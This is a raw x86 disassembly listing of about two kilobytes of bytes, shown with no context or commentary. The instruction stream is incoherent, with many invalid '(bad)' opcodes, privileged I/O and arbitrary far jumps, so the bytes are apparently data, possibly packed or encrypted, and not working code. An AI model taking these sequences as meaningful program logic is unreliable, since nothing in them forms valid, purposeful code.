  405afa:	lods   eax,DWORD PTR ds:[esi]
  405afb:	cmp    BYTE PTR [eax+0x23a37052],dl
  405b01:	and    al,0xee
  405b03:	scas   al,BYTE PTR es:[edi]
  405b04:	push   ebx
  405b05:	mov    ecx,0x4e54515c
  405b0a:	adc    bh,ch
  405b0c:	and    ebp,DWORD PTR [edx-0xa]
  405b0f:	lods   eax,DWORD PTR ds:[esi]
  405b10:	in     eax,dx
  405b11:	mov    cl,0x29
  405b13:	dec    eax
  405b14:	mov    fs,ecx
  405b16:	sbb    dh,BYTE PTR [edx+0x5ff034d]
  405b1c:	push   ebx
  405b1d:	test   al,0xee
  405b1f:	push   es
  405b20:	scas   al,BYTE PTR es:[edi]
  405b21:	xchg   esp,eax
  405b22:	add    eax,0xeaf4dc56
  405b27:	icebp  
  405b28:	ja     0x405b35
  405b2a:	dec    esi
  405b2b:	enter  0xf76e,0x6a
  405b2f:	inc    edx
  405b30:	jmp    0x51d4c02e
  405b35:	call   FWORD PTR [esp+edx*4]
  405b38:	or     bl,BYTE PTR [ebp-0x12f24634]
  405b3e:	enter  0xd6a8,0x71
  405b42:	leave  
  405b43:	add    edx,esp
  405b45:	test   eax,0xd82fd25b
  405b4a:	jb     0x405bb6
  405b4c:	in     al,dx
  405b4d:	out    0x8b,al
  405b4f:	mov    al,0xd8
  405b51:	inc    eax
  405b52:	stos   DWORD PTR es:[edi],eax
  405b53:	stos   BYTE PTR es:[edi],al
  405b54:	sub    eax,0x59a1489d
  405b59:	call   0xaf39:0x95abff14
  405b60:	push   ss
  405b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b62:	xchg   edi,eax
  405b63:	sub    bh,BYTE PTR [ebp+0x57]
  405b66:	daa    
  405b67:	push   ds
  405b68:	iret   
  405b69:	idiv   BYTE PTR [ebx+eax*1-0x27c0051]
  405b70:	sahf   
  405b71:	sar    BYTE PTR [eax+0x5054807f],0x4e
  405b78:	xchg   ebx,eax
  405b79:	(bad)  
  405b7a:	in     eax,dx
  405b7b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  405b7d:	mov    eax,0x85c1acd9
  405b82:	adc    esp,DWORD PTR [eax-0x35c70342]
  405b88:	sbb    bl,BYTE PTR [bp+di]
  405b8b:	cmp    ebx,DWORD PTR [edi-0x6e74ecb1]
  405b91:	mov    ah,0x60
  405b93:	jne    0x405bf6
  405b95:	pop    edx
  405b96:	(bad)  
  405b97:	pusha  
  405b98:	jmp    0x96d707a
  405b9d:	out    0xac,eax
  405b9f:	bound  ecx,QWORD PTR [ebx]
  405ba1:	mov    esi,0xee33fcb7
  405ba6:	pop    es
  405ba7:	mov    edi,DWORD PTR [ebx]
  405ba9:	pop    ebx
  405baa:	test   eax,0xee3a947f
  405baf:	data16 xor BYTE PTR [ecx],cl
  405bb2:	xchg   ecx,eax
  405bb3:	les    edx,FWORD PTR [edx]
  405bb5:	cwde   
  405bb6:	and    al,0xc9
  405bb9:	repnz cld 
  405bbb:	pop    es
  405bbc:	and    al,0xd4
  405bbe:	lds    edx,FWORD PTR [ecx]
  405bc0:	jo     0x405bde
  405bc2:	mov    eax,ds:0x4c04277e
  405bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bc8:	js     0x405c2e
  405bca:	add    BYTE PTR [ebx+0x42],dh
  405bcd:	sub    eax,0x3c8710d5
  405bd2:	fmul   st,st(7)
  405bd4:	xor    al,0xf1
  405bd6:	mov    eax,ds:0x1129ae17
  405bdb:	inc    eax
  405bdc:	jmp    0xea89:0x287cfeda
  405be3:	sti    
  405be4:	loop   0x405c4a
  405be6:	lods   al,BYTE PTR ds:[esi]
  405be7:	push   eax
  405be8:	push   ss
  405be9:	push   0x40
  405beb:	cmp    eax,0xd9f5f666
  405bf0:	fsubrp st(1),st
  405bf2:	popa   
  405bf3:	jge    0x405c4b
  405bf5:	rol    bh,1
  405bf7:	inc    ecx
  405bf8:	pop    ebp
  405bf9:	(bad)  
  405bfa:	fcomp  DWORD PTR [edx-0x63]
  405bfd:	and    ebx,DWORD PTR [ebp+0x4d]
  405c00:	popa   
  405c01:	stc    
  405c02:	inc    ebx
  405c03:	push   ebp
  405c04:	(bad)  
  405c05:	push   eax
  405c06:	jbe    0x405c2a
  405c08:	pop    edx
  405c09:	xchg   esi,eax
  405c0a:	pop    ds
  405c0b:	gs pop ebx
  405c0d:	push   edx
  405c0e:	(bad)  
  405c0f:	jns    0x405c20
  405c11:	fcomp  DWORD PTR [eax-0x61a5209a]
  405c17:	add    eax,0xd9c8eccb
  405c1c:	loopne 0x405c0d
  405c1e:	adc    BYTE PTR [esi],ch
  405c20:	cs stos BYTE PTR es:[edi],al
  405c22:	fstp   st(5)
  405c24:	push   esp
  405c25:	loop   0x405c04
  405c27:	loop   0x405c00
  405c29:	sbb    eax,eax
  405c2b:	mov    edi,0xe5ee9517
  405c30:	mov    ah,0x9
  405c32:	cli    
  405c33:	fstp   DWORD PTR [eax+0x2456035]
  405c39:	add    DWORD PTR [edi],edi
  405c3b:	adc    al,0x1b
  405c3d:	sub    BYTE PTR [eax],ah
  405c3f:	jmp    0x405c7f
  405c41:	sub    DWORD PTR [eax+0x7b],ebp
  405c44:	sbb    esp,DWORD PTR [eax-0x63]
  405c47:	jecxz  0x405c62
  405c49:	sahf   
  405c4a:	ret    0x969a
  405c4d:	loopne 0x405c35
  405c4f:	out    0xc4,eax
  405c51:	(bad)  
  405c52:	repnz pop edx
  405c54:	inc    ecx
  405c55:	pop    ds
  405c56:	xor    bh,BYTE PTR [ecx-0x59]
  405c59:	out    0x86,eax
  405c5b:	xchg   edx,eax
  405c5c:	adc    DWORD PTR [ecx+edi*4+0x6909f62f],eax
  405c63:	cmc    
  405c64:	(bad)  
  405c65:	out    0x62,al
  405c67:	or     DWORD PTR [esp+ebp*1-0x76],edx
  405c6b:	ror    BYTE PTR [ecx+0x2040d71f],cl
  405c71:	mov    bl,0xec
  405c73:	sub    ch,BYTE PTR [eax+0x4d1741dc]
  405c79:	sbb    eax,0x59c123a7
  405c7e:	lods   eax,DWORD PTR ds:[esi]
  405c7f:	fidivr WORD PTR [eax+0x54]
  405c82:	retf   
  405c83:	dec    BYTE PTR [edi-0x6b7d0d09]
  405c89:	fnsave [ebp+0x7df4f42b]
  405c8f:	jnp    0x405c16
  405c91:	jl     0x405cd5
  405c93:	inc    edi
  405c94:	push   es
  405c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c96:	je     0x405d05
  405c98:	add    BYTE PTR [eax+eax*4+0x36f800ec],bh
  405c9f:	and    DWORD PTR [esi-0x75],ecx
  405ca2:	test   eax,0x98e51c87
  405ca7:	push   cs
  405ca8:	mov    ecx,0x40c1b0a6
  405cad:	sub    edi,DWORD PTR [ebx+0x64]
  405cb0:	shl    DWORD PTR [eax],1
  405cb2:	aad    0x31
  405cb4:	inc    edx
  405cb5:	sbb    al,0x93
  405cb7:	mov    edx,DWORD PTR [edi]
  405cb9:	(bad)  
  405cba:	xchg   edi,eax
  405cbb:	sbb    eax,0xdcf89c3d
  405cc0:	ja     0x405c90
  405cc2:	call   0xc0c4:0x3c8c4959
  405cc9:	inc    esp
  405cca:	mov    cl,0x4b
  405ccc:	mov    dh,0x9a
  405cce:	add    bh,bl
  405cd0:	fsub   st(2),st
  405cd2:	(bad)  
  405cd3:	cmp    DWORD PTR ss:[ebp+0xc09effd],esi
  405cda:	inc    eax
  405cdb:	and    DWORD PTR ds:0xb6e575f1,ebp
  405ce1:	leave  
  405ce2:	cli    
  405ce3:	xlat   BYTE PTR ds:[ebx]
  405ce4:	sbb    eax,DWORD PTR [esi-0x22]
  405ce7:	and    al,0x6b
  405ce9:	add    al,ch
  405ceb:	scas   eax,DWORD PTR es:[edi]
  405cec:	mov    WORD PTR [ebx],ss
  405cee:	fwait
  405cef:	or     DWORD PTR [edx-0x26fff81c],eax
  405cf5:	es mov bl,0xb0
  405cf8:	call   DWORD PTR [edi]
  405cfa:	mov    WORD PTR [ebx],ss
  405cfc:	hlt    
  405cfd:	aas    
  405cfe:	lock xor BYTE PTR [ebp-0x65],dl
  405d02:	push   ecx
  405d03:	push   ss
  405d04:	xchg   ebx,eax
  405d05:	sbb    eax,0x4bd506d7
  405d0a:	(bad)  
  405d0b:	pop    ebp
  405d0c:	(bad)  
  405d0d:	nop
  405d0e:	jb     0x405d06
  405d10:	popa   
  405d11:	test   eax,0x42223c53
  405d16:	ins    DWORD PTR es:[edi],dx
  405d17:	ins    DWORD PTR es:[edi],dx
  405d18:	stos   BYTE PTR es:[edi],al
  405d19:	xchg   ebx,eax
  405d1a:	and    ch,0x7b
  405d1d:	loop   0x405d0f
  405d1f:	dec    ebx
  405d20:	xchg   esp,eax
  405d21:	(bad)
  405d25:	cmp    DWORD PTR [edx+0x5d],esi
  405d28:	and    cl,BYTE PTR [esi]
  405d2a:	aad    0xa5
  405d2c:	xchg   edi,eax
  405d2d:	cwde   
  405d2e:	sbb    al,BYTE PTR [ebp+ecx*4-0x17323747]
  405d35:	push   ebx
  405d36:	in     al,dx
  405d37:	jo     0x405cc2
  405d39:	in     eax,0xa8
  405d3b:	lods   eax,DWORD PTR ds:[esi]
  405d3c:	jl     0x405cbe
  405d3e:	and    eax,0xd4e1299e
  405d43:	push   sp
  405d45:	std    
  405d46:	mov    BYTE PTR [ebp+0xe1cb89],bh
  405d4c:	outs   dx,BYTE PTR ds:[esi]
  405d4d:	push   es
  405d4e:	retf   
  405d4f:	cmp    eax,0x583e1a1
  405d54:	push   cs
  405d55:	mov    edx,0xbaddc3a
  405d5a:	retf   0xeeca
  405d5d:	retf   0x196
  405d60:	pop    edx
  405d61:	adc    DWORD PTR [ebx],eax
  405d63:	clc    
  405d64:	inc    ebp
  405d65:	mov    esi,0x6199ab97
  405d6a:	cmc    
  405d6b:	rcr    BYTE PTR [ebx+0x49],1
  405d6e:	push   es
  405d6f:	aad    0x57
  405d71:	cmp    esi,DWORD PTR [ecx-0x70]
  405d74:	jmp    0xda27:0xc736515a
  405d7b:	xlat   BYTE PTR ds:[ebx]
  405d7c:	lods   eax,DWORD PTR ds:[si]
  405d7e:	jle    0x405da3
  405d80:	ret    0xd229
  405d83:	pop    ebx
  405d84:	sbb    cl,BYTE PTR [ebp-0x7e]
  405d87:	add    eax,0x165f4ef8
  405d8c:	xchg   ebx,eax
  405d8d:	xchg   edx,eax
  405d8e:	xor    DWORD PTR [eax],esi
  405d90:	and    ch,BYTE PTR [ebx-0x5022e000]
  405d96:	fst    DWORD PTR [ecx-0x27]
  405d99:	std    
  405d9a:	add    DWORD PTR [eax],ebp
  405d9c:	fld1   
  405d9e:	imul   esp,DWORD PTR [ebx-0x5dc3dc18],0xffffff8a
  405da5:	imul   ebp,DWORD PTR [edi],0x6b
  405da8:	das    
  405da9:	aas    
  405daa:	xor    al,0x5c
  405dac:	cmp    al,0xbf
  405dae:	mov    es,WORD PTR [esi-0x12]
  405db1:	js     0x405d90
  405db3:	stc    
  405db4:	ss icebp 
  405db6:	mov    BYTE PTR [esi+0x3809ebfd],ah
  405dbc:	cmp    al,0x6c
  405dbe:	lds    ebp,FWORD PTR [edx+0x6f6b4870]
  405dc4:	jecxz  0x405de6
  405dc6:	push   esi
  405dc7:	pop    esp
  405dc8:	sar    BYTE PTR [edi],0x79
  405dcb:	jbe    0x405e09
  405dcd:	adc    eax,0x1f283e4c
  405dd2:	imul   ecx,DWORD PTR [ecx],0xd4f6687f
  405dd8:	repz adc esp,DWORD PTR ds:0xa5a1b9e4
  405ddf:	mov    ebx,0x500383e4
  405de4:	les    ebx,FWORD PTR [ebp-0x1632867e]
  405dea:	mov    al,0x6b
  405dec:	popf   
  405ded:	imul   edx,DWORD PTR [esi-0x5],0x40
  405df1:	test   ah,ch
  405df3:	pop    fs
  405df5:	and    al,0xb8
  405df7:	xor    eax,0x668c78b9
  405dfc:	sub    al,0x40
  405dfe:	outs   dx,BYTE PTR ds:[esi]
  405dff:	(bad)  
  405e00:	push   0x2
  405e02:	xchg   ecx,eax
  405e03:	pop    ebp
  405e04:	push   esi
  405e05:	arpl   WORD PTR [eax+ecx*2-0x3315290b],ax
  405e0c:	std    
  405e0d:	fisubr WORD PTR [eax]
  405e0f:	push   ss
  405e10:	mov    cl,0x52
  405e12:	loopne 0x405da5
  405e14:	inc    esi
  405e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e16:	adc    ah,BYTE PTR [ebx-0x2aec7a3]
  405e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e1d:	push   cs
  405e1e:	fld    DWORD PTR [eax-0x66]
  405e21:	std    
  405e22:	fxch   st(0)
  405e24:	adc    ecx,edx
  405e26:	icebp  
  405e27:	sbb    ecx,edx
  405e29:	leave  
  405e2a:	xor    ebx,DWORD PTR [ecx-0x5b99b01f]
  405e30:	loopne 0x405e0d
  405e32:	jmp    0xe38a:0x589de912
  405e39:	test   eax,0xe9740bf8
  405e3e:	psubd  mm1,QWORD PTR [eax]
  405e41:	fistp  QWORD PTR [edi-0x57]
  405e44:	not    BYTE PTR [eax+edi*2+0x76f1348a]
  405e4b:	push   eax
  405e4c:	maxps  xmm5,XMMWORD PTR [edi+0x5036bc93]
  405e53:	mov    esp,0x56518127
  405e58:	and    BYTE PTR [eax],ah
  405e5a:	xchg   ebp,eax
  405e5b:	mov    esi,0x465196ac
  405e60:	out    0x32,al
  405e62:	mov    edi,0x38f5c966
  405e67:	test   al,0x15
  405e69:	stc    
  405e6a:	add    dl,0xa4
  405e6d:	in     al,dx
  405e6e:	leave  
  405e6f:	add    al,0x33
  405e71:	add    al,0xeb
  405e73:	or     DWORD PTR cs:[eax+ebp*4-0xf45e605],edx
  405e7b:	stos   BYTE PTR es:[edi],al
  405e7c:	mov    eax,0x9e693762
  405e81:	fadd   QWORD PTR [ecx+0x39]
  405e84:	cmp    al,0x38
  405e86:	pop    ds
  405e87:	xor    eax,0xa1bb0f13
  405e8c:	mov    ebx,0xea9cae00
  405e91:	mov    esi,0x85e77ac7
  405e96:	das    
  405e97:	jl     0x405e96
  405e99:	outs   dx,BYTE PTR ds:[esi]
  405e9a:	outs   dx,BYTE PTR ds:[esi]
  405e9b:	cdq    
  405e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e9d:	mov    dh,BYTE PTR [esi+0x7b]
  405ea0:	popf   
  405ea1:	add    eax,0x3505ff0e
  405ea6:	mov    ecx,0xdb29cc45
  405eab:	sbb    al,0xd6
  405ead:	pop    eax
  405eae:	cmp    BYTE PTR ds:0xd1b3a37a,al
  405eb4:	aad    0x9b
  405eb6:	daa    
  405eb7:	add    ecx,DWORD PTR [ecx-0x34be1541]
  405ebd:	popa   
  405ebe:	fisttp WORD PTR [ecx+0x113ea2fe]
  405ec4:	xlat   BYTE PTR ds:[ebx]
  405ec5:	or     bh,BYTE PTR [esi]
  405ec7:	in     al,0x87
  405ec9:	pop    ebp
  405eca:	ret    
  405ecb:	shr    BYTE PTR ds:0x820f93f5,1
  405ed1:	aam    0x13
  405ed3:	mov    eax,ds:0xef797f71
  405ed8:	popa   
  405ed9:	push   es
  405eda:	cdq    
  405edb:	jmp    0xf404bef0
  405ee0:	adc    DWORD PTR [eax-0x6bd6e0fe],ebx
  405ee6:	adc    BYTE PTR [ebx],bh
  405ee8:	jne    0x405eb4
  405eea:	mov    dl,0xe
  405eec:	nop
  405eed:	lods   eax,DWORD PTR ds:[esi]
  405eee:	and    ch,BYTE PTR [eax]
  405ef0:	test   eax,0xb5c788ad
  405ef5:	xor    bh,BYTE PTR [ebx+eiz*8+0x74e952b1]
  405efc:	int    0x75
  405efe:	cmp    al,BYTE PTR [esi-0x46]
  405f01:	jnp    0x405eee
  405f03:	jmp    0xfc7b:0xcd8804bc
  405f0a:	adc    eax,0xda983ee1
  405f0f:	ret    0xc1c5
  405f12:	(bad)  
  405f13:	ficomp DWORD PTR [eax-0x17]
  405f16:	mov    ch,0x82
  405f18:	inc    ebx
  405f19:	inc    esp
  405f1a:	jns    0x405f2e
  405f1c:	mov    ah,BYTE PTR [ebp-0x1c]
  405f1f:	jp     0x405f68
  405f21:	xor    BYTE PTR [edi-0x4cb49f9e],0xc0
  405f28:	push   ecx
  405f29:	or     al,0x5e
  405f2b:	out    dx,al
  405f2c:	hlt    
  405f2d:	jmp    0xfef20a42
  405f32:	popf   
  405f33:	cmp    al,0xf8
  405f35:	xor    DWORD PTR [edx-0x2b7f5494],ebp
  405f3b:	add    dl,ch
  405f3d:	adc    eax,0x56ea3b90
  405f42:	je     0x405f6c
  405f44:	pop    eax
  405f45:	add    BYTE PTR [eax+0x50],bl
  405f48:	inc    ecx
  405f49:	lock adc eax,0x13c469cc
  405f4f:	sbb    ah,BYTE PTR [esp+eax*4+0x5ee6e0f4]
  405f56:	or     dh,bh
  405f58:	sub    BYTE PTR [edi+0x74],al
  405f5b:	or     ebx,DWORD PTR [ecx+0x1716efcb]
  405f61:	jns    0x405f57
  405f63:	mov    cl,0xfd
  405f65:	(bad)  [eax+0x33]
  405f68:	cmp    DWORD PTR [edi+0x6f],esp
  405f6b:	imul   edx,DWORD PTR [edx+0xa],0x67
  405f6f:	int3   
  405f70:	and    DWORD PTR [esi+esi*8],eax
  405f73:	inc    esi
  405f74:	xor    dh,cl
  405f76:	or     ecx,DWORD PTR [eax+ebx*2+0x1fa6a126]
  405f7d:	scas   eax,DWORD PTR es:[edi]
  405f7e:	mov    DWORD PTR [ebp+ecx*1+0x59bc4f89],ebx
  405f85:	jns    0x405fbb
  405f87:	lods   eax,DWORD PTR ds:[esi]
  405f88:	push   ebp
  405f89:	sti    
  405f8a:	push   esi
  405f8b:	fstp   st(2)
  405f8d:	xchg   ebx,eax
  405f8e:	or     eax,0x91a87237
  405f93:	hlt    
  405f94:	loopne 0x405fe8
  405f96:	(bad)  
  405f97:	lds    ecx,FWORD PTR [ebx+0x2e]
  405f9a:	cmp    dl,BYTE PTR [eax+0x2f3400fe]
  405fa0:	ror    al,cl
  405fa2:	or     dl,BYTE PTR [ecx]
  405fa4:	leave  
  405fa5:	into   
  405fa6:	cmp    ah,0xd
  405fa9:	aas    
  405faa:	push   ebx
  405fab:	inc    ecx
  405fac:	sbb    al,0x9c
  405fae:	je     0x405f9c
  405fb0:	mov    dh,0x42
  405fb2:	fist   DWORD PTR [edi]
  405fb4:	loope  0x406003
  405fb6:	sub    DWORD PTR [edx],esi
  405fb8:	jns    0x405f4c
  405fba:	(bad)  
  405fbb:	aas    
  405fbc:	adc    edi,ecx
  405fbe:	data16 icebp 
  405fc0:	arpl   WORD PTR [esi+0x39],bp
  405fc3:	lahf   
  405fc4:	cld    
  405fc5:	cmp    dl,BYTE PTR [eax+0x35]
  405fc8:	cmp    eax,0x4d205927
  405fcd:	push   esi
  405fce:	cmc    
  405fcf:	into   
  405fd0:	inc    ebx
  405fd1:	rcr    ah,cl
  405fd3:	push   edx
  405fd4:	push   ss
  405fd5:	mov    ah,0xd6
  405fd7:	ret    0x4107
  405fda:	pop    es
  405fdb:	xor    edi,0xfbb376af
  405fe1:	or     BYTE PTR [esi+0x36],ch
  405fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe5:	mov    bh,0xf6
  405fe7:	ja     0x405ffc
  405fe9:	int3   
  405fea:	jl     0x406016
  405fec:	add    BYTE PTR [ecx+0x230f2f87],cl
  405ff2:	out    0x8b,al
  405ff4:	test   BYTE PTR [edx],al
  405ff6:	xor    ah,0xa8
  405ff9:	daa    
  405ffa:	cmp    eax,0xba16296b
  405fff:	jmp    0x3bd569a2
  406004:	add    DWORD PTR [edx+0x42124f75],esi
  40600a:	mov    ebx,0x47f38177
  40600f:	loop   0x405ffa
  406011:	ss cdq 
  406013:	data16 (bad) 
  406015:	mov    edx,0x848586f2
  40601a:	rol    DWORD PTR [eax+0x1e84cff2],0xb9
  406021:	mov    ebx,0x8b7ae356
  406026:	in     al,dx
  406027:	and    BYTE PTR [ecx+esi*8+0x7cea1cbe],0x1
  40602f:	bound  esi,QWORD PTR [edx+0x1483bc1d]
  406035:	cmp    DWORD PTR [esi+0x1],edi
  406038:	cmp    DWORD PTR [esi-0x6a],edx
  40603b:	(bad)  
  40603c:	jecxz  0x406018
  40603e:	into   
  40603f:	or     BYTE PTR [ecx],dh
  406041:	es inc ebp
  406043:	mov    al,ds:0x4174ea4f
  406048:	pop    eax
  406049:	mov    ah,0x48
  40604b:	mov    cl,0xc2
  40604d:	cmp    cl,dl
  40604f:	outs   dx,DWORD PTR ds:[esi]
  406050:	addr16 lahf 
  406052:	out    dx,al
  406053:	add    eax,0x31955c73
  406058:	popa   
  406059:	mov    ds:0x4dc4e48a,eax
  40605e:	lahf   
  40605f:	push   ds
  406060:	loopne 0x406061
  406062:	mov    edi,DWORD PTR [ebx-0x4]
  406065:	inc    ebp
  406066:	pop    ebx
  406067:	iret   
  406068:	test   al,0x16
  40606a:	or     WORD PTR [edx-0x3a1f8a4d],0xc6b2
  406073:	lods   al,BYTE PTR ds:[esi]
  406074:	and    dl,cl
  406076:	adc    DWORD PTR [edx+0x1541080a],esp
  40607c:	add    BYTE PTR [edx+edi*8],0x4f
  406080:	ja     0x406032
  406082:	adc    eax,0x6b3f0fee
  406087:	dec    esi
  406088:	and    al,0x41
  40608a:	outs   dx,DWORD PTR ds:[esi]
  40608b:	mov    cl,0x53
  40608d:	inc    ecx
  40608e:	mov    dh,0x4c
  406090:	jns    0x40609a
  406092:	adc    eax,0xb83c2d3a
  406097:	das    
  406098:	ds icebp 
  40609a:	jnp    0x40605c
  40609c:	and    DWORD PTR [ebx-0x14595246],esp
  4060a2:	adc    cl,ah
  4060a4:	clc    
  4060a5:	mov    ebx,0x2481b932
  4060aa:	add    DWORD PTR [edi+0x6a],eax
  4060ad:	or     eax,0xfe4dcb7
  4060b2:	mov    ah,0x58
  4060b4:	(bad)  [ecx+0x9]
  4060b7:	xor    al,0xa7
  4060b9:	imul   ebp,DWORD PTR [ebx-0x5c],0xffffffb2
  4060bd:	push   ds
  4060be:	lock xor eax,0x84023f7
  4060c4:	adc    BYTE PTR [edx],0x99
  4060c7:	mov    dl,0xeb
  4060c9:	adc    eax,0x5c020efe
  4060ce:	cmp    DWORD PTR [edx+0x667d7b45],ebp
  4060d4:	or     eax,0xfb6a73fb
  4060d9:	aad    0x2d
  4060db:	inc    ecx
  4060dc:	jl     0x4060c2
  4060de:	jge    0x406110
  4060e0:	mov    ah,0xee
  4060e2:	sub    bl,BYTE PTR [eax]
  4060e4:	push   ss
  4060e5:	pop    ds
  4060e6:	test   al,0x9c
  4060e8:	in     eax,0x3c
  4060ea:	xchg   ecx,eax
  4060eb:	mov    ebp,DWORD PTR [ecx-0x4e]
  4060ee:	addr16 dec ebp
  4060f0:	mov    eax,ds:0x5c6c8e2
  4060f5:	inc    edx
  4060f6:	cdq    
  4060f7:	adc    al,0x87
  4060f9:	mov    esp,0x781f3820
  4060fe:	inc    esp
  4060ff:	shl    DWORD PTR [edx+0x7f3fb3b7],cl
  406105:	fs popa 
  406107:	sbb    DWORD PTR [ebx+0x40],esp
  40610a:	or     DWORD PTR [esi],ebx
  40610c:	xor    ah,BYTE PTR [ebx]
  40610e:	nop
  40610f:	(bad)  [ecx-0x189e08f6]
  406115:	cli    
  406116:	push   ss
  406117:	adc    ch,BYTE PTR [edi+0x23c40222]
  40611d:	enter  0xdded,0x53
  406121:	push   es
  406122:	nop
  406123:	mov    al,0xa7
  406125:	mov    edx,0x7bbc9cab
  40612a:	sbb    DWORD PTR [edi+ebx*8-0x5a],edi
  40612e:	xchg   DWORD PTR [ecx+0x18],ecx
  406131:	cmp    ah,cl
  406133:	sbb    eax,0x5d79df7e
  406138:	fidivr WORD PTR [ebx+0x66]
  40613b:	sub    ecx,DWORD PTR [ecx]
  40613d:	sub    eax,esi
  40613f:	sbb    cl,BYTE PTR [edi]
  406141:	retf   0xdcc2
  406144:	jbe    0x406160
  406146:	scas   eax,DWORD PTR es:[edi]
  406147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406148:	das    
  406149:	mov    eax,0x149996a2
  40614e:	fwait
  40614f:	jbe    0x40617d
  406151:	aad    0x26
  406153:	inc    esi
  406154:	add    esp,DWORD PTR [eax+0x2f]
  406157:	arpl   WORD PTR [edx],dx
  406159:	pop    edx
  40615a:	cmp    DWORD PTR [ebp+ebp*2+0x38de0736],ebx
  406161:	(bad)  
  406162:	fisubr DWORD PTR [eax+eiz*2]
  406165:	mov    WORD PTR [esi+ebx*8+0x45],cs
  406169:	or     DWORD PTR [ecx-0x91af20c],edi
  40616f:	inc    eax
  406170:	fcomp  QWORD PTR [esp-0xa]
  406174:	(bad)  
  406176:	out    0x2,al
  406178:	ins    BYTE PTR es:[edi],dx
  406179:	nop
  40617a:	inc    eax
  40617b:	mov    BYTE PTR [esp+edi*1],cl
  40617e:	aam    0x24
  406180:	call   0x2572:0xfea9dcda
  406187:	xor    BYTE PTR [edx],dh
  406189:	iret   
  40618a:	icebp  
  40618b:	or     cl,BYTE PTR [ecx]
  40618d:	int3   
  40618e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40618f:	leave  
  406190:	mov    eax,ds:0x311d492f
  406195:	inc    esp
  406196:	out    0xe3,eax
  406198:	push   ecx
  406199:	add    ch,cl
  40619b:	mov    ah,0x96
  40619d:	dec    edx
  40619e:	xor    ebx,ebp
  4061a0:	mov    esi,0xadd20e47
  4061a5:	cmp    al,0x24
  4061a7:	jg     0x406198
  4061a9:	push   0xffffff80
  4061ab:	shl    bh,0x6e
  4061ae:	test   BYTE PTR [eax-0x75],al
  4061b1:	mov    ds:0xe4b7568c,eax
  4061b6:	adc    BYTE PTR [edx+0x37ec342d],dl
  4061bc:	shrd   ebp,ecx,0x67
  4061c0:	or     eax,DWORD PTR [edi-0x59]
  4061c3:	pop    ecx
  4061c4:	inc    esp
  4061c5:	mov    esi,0xe8beadcb
  4061ca:	add    al,0x3a
  4061cc:	(bad)  
  4061cd:	stc    
  4061ce:	sub    ebx,DWORD PTR [edi+0x43]
  4061d1:	cmp    DWORD PTR ds:0x357b3a16,ecx
  4061d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d8:	dec    eax
  4061d9:	jae    0x40615e
  4061db:	mov    dh,0xc
  4061dd:	div    BYTE PTR [ebp+0x5d787c02]
  4061e3:	fiadd  WORD PTR ds:0x2deecb4c
  4061e9:	pop    ds
  4061ea:	xchg   edi,eax
  4061eb:	adc    DWORD PTR [esi+0x71],ecx
  4061ee:	cmp    BYTE PTR [ebp+0x15],al
  4061f1:	xor    DWORD PTR [edi+eiz*4-0x365213f6],esi
  4061f8:	mov    bh,0xfb
  4061fa:	pop    eax
  4061fb:	lods   al,BYTE PTR ds:[esi]
  4061fc:	daa    
  4061fd:	jb     0x406200
  4061ff:	jns    0x406248
  406201:	mov    dh,0xd0
  406203:	xlat   BYTE PTR ds:[ebx]
  406204:	ins    DWORD PTR es:[edi],dx
  406205:	cmp    bh,BYTE PTR [eax-0x6df19957]
  40620b:	mov    ds:0x7bad082c,eax
  406210:	push   cs
  406211:	lds    ecx,FWORD PTR [edi]
  406213:	jb     0x4061b4
  406215:	sub    al,0x48
  406217:	gs jae 0x40628a
  40621a:	loopne 0x406258
  40621c:	cmp    eax,0xb0956581
  406221:	pushf  
  406222:	xor    al,0x9d
  406224:	add    BYTE PTR [ebp+0x15],bl
  406227:	push   es
  406228:	fst    QWORD PTR ds:0xd8e25f59
  40622e:	jmp    0x3a14:0x6dc99291
  406235:	push   0x4f15fe0
  40623a:	mov    ebp,0x7d24b69a
  40623f:	lods   al,BYTE PTR ds:[esi]
  406240:	(bad)  
  406241:	ja     0x406284
  406243:	in     al,dx
  406244:	mov    esi,0x9ebbe400
  406249:	push   edx
  40624a:	push   ecx
  40624b:	fwait
  40624c:	popf   
  40624d:	mov    es,WORD PTR [ecx+edx*1]
  406250:	jno    0x4061e7
  406252:	shl    BYTE PTR [ecx+0x61],cl
  406255:	jg     0x40627e
  406257:	xor    ch,BYTE PTR [edi]
  406259:	sbb    DWORD PTR [ebx+0x45],ebx
  40625c:	or     cl,bl
  40625e:	dec    edi
  40625f:	imul   edi,ebp,0x7
  406262:	call   0x1618:0x93378d47
  406269:	sti    
  40626a:	ds sub cl,ah
  40626d:	mov    bh,0xdf
  40626f:	dec    ebp
  406270:	mov    edx,0xc5eea0e0
  406275:	test   BYTE PTR [esi+edi*4],ch
  406278:	fistp  WORD PTR [esi]
  40627a:	das    
  40627b:	pop    ds
  40627c:	and    al,0x7f
  40627e:	inc    ebp
  40627f:	mov    ch,0x5c
  406281:	ficom  WORD PTR [ebx+0x52]
  406284:	cmp    eax,0xd807fb8e
  406289:	int3   
  40628a:	pop    esp
  40628b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40628c:	mov    esi,0xb064bcc0
  406291:	in     al,0xa9
  406293:	or     esp,esp
  406295:	and    ebx,DWORD PTR [edx+0x603389ab]
  40629b:	sbb    dl,BYTE PTR [ebx-0x28]
  40629e:	xor    bh,ah
  4062a0:	fcom   QWORD PTR [ebx+0x58]
  4062a3:	out    0x94,eax
  4062a5:	pop    es
  4062a6:	(bad)  
  4062a8:	dec    ebp
  4062a9:	int3   
  4062aa:	(bad)  
  4062ab:	jnp    0x40625f
  4062ad:	sti    
  4062ae:	push   ebx
  4062af:	aas    
  4062b0:	push   0x859c6bf9
  4062b5:	std    
  4062b6:	ret    0xbbef
  4062b9:	push   edi
  4062ba:	cmp    al,0x54
  4062bc:	push   0xb804ae03
  4062c1:	ret    0x2766
  4062c4:	mov    DWORD PTR [edi],ebp
